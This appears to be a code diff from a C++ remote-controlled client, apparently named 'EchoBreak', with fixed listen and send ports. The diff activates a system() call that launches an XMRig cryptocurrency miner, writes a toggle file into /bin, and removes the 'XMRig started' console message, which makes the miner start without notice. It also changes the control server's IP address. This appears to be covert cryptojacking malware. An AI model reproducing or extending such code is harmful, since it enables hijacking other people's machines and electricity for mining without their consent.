@@ -6,7 +6,7 @@
 #include <vector>
 #include <array>
 #include <memory>
-#include <iostream>
+
 #define REC_PORT 6969
 #define SENDING_PORT 6868
 #define BUFFER_SIZE 256
@@ -59,11 +59,10 @@ public:
 
     inline void runXmrig() 
     { 
-        //system("EchoBreak-xmrig/xmrig-6.22.2/./xmrig"); 
-        //is_xmrig_running = "runnning"; 
+        system("EchoBreak-xmrig/xmrig-6.22.2/./xmrig"); 
+        is_xmrig_running = "runnning"; 
         std::ofstream ix("/bin/ix", std::ios::out); // is xmrig running (xmrig toggle)
         ix << "1"; ix.close();
-        std::cout << "XMRig started" << std::endl;
     };
 
     inline void stopXmrig() 
@@ -92,7 +91,7 @@ private:
 
     std::string is_xmrig_running = "standby";
 
-    std::string m_ip = "128.0.0.1";
+    std::string m_ip = "127.0.0.1";
 
 private:
     // Variables for sending data to the server
